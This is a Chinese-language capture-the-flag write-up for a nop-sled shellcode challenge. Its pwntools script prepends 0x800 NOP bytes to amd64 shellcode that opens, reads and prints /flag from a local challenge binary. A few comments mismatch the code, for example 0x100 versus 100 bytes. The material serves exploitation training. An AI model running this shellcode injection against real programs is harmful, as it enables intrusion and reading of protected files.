# 挑战简介
```
此挑战将随机跳过 shellcode 中最多 0x800 个字节。您最好适应这一点！避免这种情况的一种方法是让您的 shellcode 以一长组不执行任何操作的单字节指令（例如“nop”）开始，
然后才开始执行代码的实际功能。当控制流遇到任何这些指令时，它们都将无害地执行，然后您的真实 shellcode 将运行。这个概念称为“nop sled”
```

# 思路
代码层面和上一题没区别,依旧是打开flag->读取flag->写入flag  
只不过有些许限制  
前0x800个字符将不可用,也就是说你的代码应该在0x800之后  
那么我们可以写入0x800的NOP来填充这一段  
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)
p = process('/challenge/binary-exploitation-nopsled-shellcode')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

nop_sled_length = 0x800

nop_sled = asm('nop') * nop_sled_length

shellcode = asm('''
    xor rax, rax                      # 清理rax
    mov rdi, 0x67616c662f             # 移动 '/flag' 进 rdi
    push rdi                          # 推rdi进栈
    mov rdi, rsp                      # rsp指向flag, 替代rdi
    xor rsi, rsi                      # 清理 rdi
    xor rdx, rdx                      # 清理 rdx 
    mov rax, 2                        # 执行打开指令
    syscall                           # open('/flag', O_RDONLY)

    mov rdi, rax                      # 文件描述符
    mov rsi, rsp                      # 移动缓冲区进栈
    mov rdx, 100                      # 读取的字节数
    xor rax, rax                      # 执行读取指令
    syscall                           # read(fd, buffer, 0x100)

    mov rdi, 1                        # 输出描述符
    mov rax, 1                        # 执行写入
    syscall                           # write(stdout, buffer, 0x100)
''')

# 构建payload
payload_o = nop_sled + shellcode  #前0x800的填充

payload = shellcode.ljust(0x1000, b'\x90')  # 填充剩余空间为NOP指令
print(len(payload))
p.send(payload_o)
output = p.recvall()
print(output.decode(errors='ignore'))
```
